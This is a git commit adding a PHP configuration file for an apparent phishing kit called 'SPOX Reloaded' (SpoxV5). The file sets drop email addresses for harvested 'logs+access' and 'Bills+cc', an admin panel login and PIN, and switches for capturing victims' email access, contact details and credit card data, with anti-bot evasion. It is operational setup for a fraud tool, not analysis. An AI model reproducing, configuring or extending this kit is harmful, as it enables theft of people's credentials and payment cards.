803c27deda9b75c17478a8dcc8cb863bb40e8bad
rajcarder85 <79537571+rajcarder85@users.noreply.github.com>
2021-02-23 18:32:53 +0000

    spox

---
+++ SpoxV5/admin/YOUR-CONFIG.php
@@ -0,0 +1,33 @@
+<?php
+
+
+// SPAM INFO
+
+$yourname = "SPOX Reloaded";     //insert your name
+$your_email = "chase@yandex.com"; // logs+access
+$your_email2 = "chase2@yandex.com"; // Bills+cc
+
+
+//ADMIN LOGIN INFO   (yourdomain.com/admin/login.php)
+
+$username = "admin";          //insert your login name
+$password = "012345";        // insert your login password
+$pin = "645345343256451"; 
+
+
+
+// ON / OFF 
+$spam_hotmail = "no";
+$double_login = "no";
+$double_access = "yes";
+$spox_protection = "yes";
+$double_cc = "no";
+$show_start_page = "yes"; 
+$show_email_access = "yes"; 
+$show_contact_information = "yes";
+$show_credit_card = "yes";
+$show_success_page = "yes";
+$anti_bot = "yes";
+
+
+?>
